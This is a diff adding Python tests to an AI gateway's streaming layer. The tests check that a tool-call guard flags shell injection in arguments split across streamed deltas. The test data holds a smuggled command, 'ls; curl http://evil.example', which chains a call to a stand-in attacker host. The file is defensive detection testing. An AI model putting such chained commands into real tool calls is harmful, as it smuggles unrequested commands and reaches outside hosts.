@@ -2,6 +2,7 @@ from __future__ import annotations
 
 import asyncio
 import io
+import json
 import logging
 from collections.abc import AsyncGenerator
 
@@ -23,6 +24,7 @@ from aegisgate.adapters.openai_compat.router import (
     _patch_chat_stream_payload,
     _run_request_pipeline,
     _run_response_pipeline,
+    _run_stream_response_probe,
     _stream_block_reason,
     _stream_block_sse_chunk,
 )
@@ -2387,6 +2389,187 @@ def test_execute_chat_stream_injects_tool_call_finish_without_replay_text_on_ups
     assert '"recovered": true' in text
     assert _UPSTREAM_EOF_RECOVERY_NOTICE not in text
     assert "data: [DONE]" in text
+
+
+# Same argument text as test_tool_call_guard_flags_shell_injection_in_args.
+_STREAM_TOOL_ARG_PHRASE = "ls; curl http://evil.example"
+
+
+def _chat_tool_delta_frame(
+    arguments: str,
+    *,
+    name: str | None = None,
+    call_id: str | None = None,
+) -> bytes:
+    function: dict[str, str] = {"arguments": arguments}
+    if name is not None:
+        function["name"] = name
+    tool_call: dict[str, object] = {"index": 0, "function": function}
+    if call_id is not None:
+        tool_call["id"] = call_id
+        tool_call["type"] = "function"
+    delta: dict[str, object] = {"tool_calls": [tool_call]}
+    if name is not None:
+        delta["role"] = "assistant"
+    payload = {
+        "id": "c1",
+        "object": "chat.completion.chunk",
+        "choices": [{"index": 0, "delta": delta, "finish_reason": None}],
+    }
+    return f"data: {json.dumps(payload, ensure_ascii=False)}\n\n".encode("utf-8")
+
+
+def _chat_tool_finish_frame() -> bytes:
+    payload = {
+        "id": "c1",
+        "object": "chat.completion.chunk",
+        "choices": [{"index": 0, "delta": {}, "finish_reason": "tool_calls"}],
+    }
+    return f"data: {json.dumps(payload, ensure_ascii=False)}\n\n".encode("utf-8")
+
+
+def _run_chat_tool_call_stream(
+    monkeypatch: pytest.MonkeyPatch,
+    frames: list[bytes],
+) -> tuple[str, list[str], list[list[str]]]:
+    """Drive a chat stream with the real response pipeline.
+
+    Returns the SSE text, tool_call_guard enforcement actions, and the
+    argument strings submitted on each probe.
+    """
+    _install_inline_payload_transform(monkeypatch)
+    monkeypatch.setattr(
+        "aegisgate.adapters.openai_compat.router._build_streaming_response",
+        lambda generator: generator,
+    )
+
+    async def fake_forward_stream_lines(url, payload, headers):
+        del url, payload, headers
+        for frame in frames:
+            yield frame
+
+    monkeypatch.setattr(
+        "aegisgate.adapters.openai_compat.router._forward_stream_lines",
+        fake_forward_stream_lines,
+    )
+
+    probed_arguments: list[list[str]] = []
+
+    async def spy_probe(**kwargs):
+        arguments: list[str] = []
+        for call in kwargs.get("tool_calls") or []:
+            if not isinstance(call, dict):
+                continue
+            function = call.get("function")
+            if isinstance(function, dict) and function.get("arguments") is not None:
+                arguments.append(str(function.get("arguments")))
+            elif call.get("arguments") is not None:
+                arguments.append(str(call.get("arguments")))
+        probed_arguments.append(arguments)
+        return await _run_stream_response_probe(**kwargs)
+
+    monkeypatch.setattr(
+        "aegisgate.adapters.openai_compat.router._run_stream_response_probe",
+        spy_probe,
+    )
+
+    captured: dict[str, list[str]] = {}
+
+    def capture_audit(ctx, boundary=None):
+        del boundary
+        captured["actions"] = [
+            action
+            for action in ctx.enforcement_actions
+            if action.startswith("tool_call_guard:")
+        ]
+
+    monkeypatch.setattr(
+        "aegisgate.adapters.openai_compat.router._write_audit_event",
+        capture_audit,
+    )
+
+    payload = {
+        "request_id": "r-stream-tool-args",
+        "session_id": "s-stream-tool-args",
+        "model": "test-model",
+        "stream": True,
+        "messages": [{"role": "user", "content": "hello"}],
+    }
+
+    async def run_case() -> bytes:
+        response = await _execute_chat_stream_once(
+            payload=payload,
+            request_headers={"X-Upstream-Base": "https://upstream.example.com/v1"},
+            request_path="/v1/chat/completions",
+            boundary={},
+        )
+        return await _collect_execute_stream(response)
+
+    text = asyncio.run(run_case()).decode("utf-8", errors="replace")
+    return text, captured.get("actions", []), probed_arguments
+
+
+def test_chat_stream_tool_call_guard_hits_arguments_split_across_deltas(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """Chat streaming must scan tool-call arguments after the deltas are joined.
+
+    Upstream sends ``function.arguments`` in pieces. The phrase is the one
+    ``test_tool_call_guard_flags_shell_injection_in_args`` already flags. It is
+    split after the semicolon, so neither delta contains ``; curl`` and only
+    the concatenation matches ``tool_call_guard``.
+    """
+    head = '{"cmd":"ls;'
+    tail = ' curl http://evil.example"}'
+    assert "; curl" not in head
+    assert "; curl" not in tail
+    assert head + tail == '{"cmd":"' + _STREAM_TOOL_ARG_PHRASE + '"}'
+
+    text, actions, probed = _run_chat_tool_call_stream(
+        monkeypatch,
+        [
+            _chat_tool_delta_frame(head, name="run_task", call_id="call_1"),
+            _chat_tool_delta_frame(tail),
+            _chat_tool_finish_frame(),
+            b"data: [DONE]\n\n",
+        ],
+    )
+
+    assert "data: [DONE]" in text
+    # review does not stop the stream, and the client still reassembles the deltas.
+    assert "ls;" in text
+    assert "curl http://evil.example" in text
+    joined = head + tail
+    assert any(joined in fragment for fragments in probed for fragment in fragments), (
+        "probes saw argument fragments separately, not the joined arguments; "
+        f"probed_arguments={probed!r}"
+    )
+    assert any(action.startswith("tool_call_guard:dangerous_param:") for action in actions), (
+        "joined tool-call arguments were not submitted to tool_call_guard; "
+        f"actions={actions!r} probed_arguments={probed!r}"
+    )
+
+
+def test_chat_stream_tool_call_guard_hits_arguments_in_one_delta(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """A single delta that already contains the whole phrase is scanned too.
+
+    The phrase is the one ``test_tool_call_guard_flags_shell_injection_in_args``
+    already flags. This pins the path that does not need accumulation.
+    """
+    arguments = '{"cmd":"' + _STREAM_TOOL_ARG_PHRASE + '"}'
+    text, actions, _probed = _run_chat_tool_call_stream(
+        monkeypatch,
+        [
+            _chat_tool_delta_frame(arguments, name="run_task", call_id="call_1"),
+            _chat_tool_finish_frame(),
+            b"data: [DONE]\n\n",
+        ],
+    )
+
+    assert "data: [DONE]" in text
+    assert any(action.startswith("tool_call_guard:dangerous_param:") for action in actions)
 
 
 def test_execute_responses_stream_returns_error_chunk_when_gateway_internal_error(
